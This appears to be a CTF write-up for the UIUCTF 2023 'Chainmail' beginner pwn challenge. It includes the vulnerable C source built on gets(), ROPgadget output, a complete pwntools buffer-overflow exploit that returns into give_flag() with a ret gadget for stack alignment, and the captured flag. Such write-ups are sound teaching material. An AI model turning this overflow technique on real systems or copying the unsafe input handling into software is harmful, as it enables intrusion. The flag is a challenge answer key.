# :game_die: UIUCTF 2023 - Chainmail. Chainmail

---

# UIUCTF 2023 — Chainmail

Categories: pwn, beginner

Description:

>

I’ve come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!

$ nc chainmail.chal.uiuc.tf 1337

author: Emma

chal chal.c Dockerfile

Tags: pwn, stack alignment, trivial

### Solution

In the chal.c we got the source code

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
FILE *f = fopen("/flag.txt", "r");
if (f != NULL) {
char c;
while ((c = fgetc(f)) != EOF) {
putchar(c);
}
}
else {
printf("Flag not found!\n");
}
fclose(f);
}

int main(int argc, char **argv) {
setvbuf(stdout, NULL, _IONBF, 0);
setvbuf(stderr, NULL, _IONBF, 0);
setvbuf(stdin, NULL, _IONBF, 0);

char name[64];
printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
gets(name);
printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
return 0;
}
```

When we execute the program it prints out the welcome message and asks for a ***name***.
It uses the vulnerable ***gets() ***function to read our response.

## Get Szigecsán Dávid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

With a simple buffer overflow, we can overwrite the main function’s return address to execute the ***give_flag()*** function and provide the flag for us.

We have all the information we need.

The buffer size for the ***name*** variable: ***64 bytes***.
Additional ***8 bytes*** to reach the return address.

After trying the exploit locally, everything works perfectly, but when we try it on the remote machine, it won't work.

The problem is the [stack alignment issue](https://ropemporium.com/guide.html#Common%20pitfalls) also known as the MOVAPS issue.

To fix the MOVAPS issue we need an additional ret instruction in our payload.

We can find the ret instruction with [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

```
$ ROPgadget --binary ./chal --ropchain
Gadgets information
============================================================
0x000000000040118b : add bh, bh ; loopne 0x4011f5 ; nop ; ret
0x000000000040115c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401336 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401337 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011fa : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040115e : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401338 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011fb : add byte ptr [rcx], al ; pop rbp ; ret
...
0x000000000040101a : ret
...
0x0000000000401340 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401183 : test eax, eax ; je 0x401190 ; mov edi, 0x404068 ; jmp rax
0x00000000004011c5 : test eax, eax ; je 0x4011d0 ; mov edi, 0x404068 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
```

After that, we have our complete solution.

```
#!/usr/bin/python

import argparse
import pwn

# ================================================
# Boilerplate
# ================================================

parser = argparse.ArgumentParser()
parser.add_argument('destination', type=str, choices={'local', 'remote'})
parser.add_argument('--target', '-t', type=str, required=False)
parser.add_argument('--port', '-p', type=str, required=False)
args = parser.parse_args()

# ================================================
# Exploit generation
# ================================================

pwn.context.binary = binary = pwn.ELF('./chal')
pwn.context.log_level = 'info'

give_flag_return_address = pwn.p64(binary.symbols.give_flag)

# MOVAPS issue
ret_address = b''
if args.destination == 'remote':
ret_address = pwn.p64(0x40101a)
payload = b'A' * 64 + b'B' * 8 + ret_address + give_flag_return_address

# ================================================
# Local / GDB / Remote
# ================================================

if args.destination == 'local':
p = pwn.process()
else:
if not args.target or not args.port:
pwn.error('Please provide target and port!')
exit()
p = pwn.remote(args.target, args.port)

# ================================================
# Send exploit & Receive flag
# ================================================
p.recv()
p.sendline(payload)
p.recvuntil("Jim\n")
pwn.warning("Flag: " + p.recv().decode('utf-8'))
p.interactive()
```

We can run it on the local or remote server, both cases will work properly.

```
$ ./solution.py -t chainmail.chal.uiuc.tf -p 1337 remote
[*] '/tmp/aaa/chal'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[+] Starting local process '/tmp/aaa/chal': pid 27788
/tmp/aaa/./solution.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
p.recvuntil("Jim\n")
[!] Flag: uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
```

---
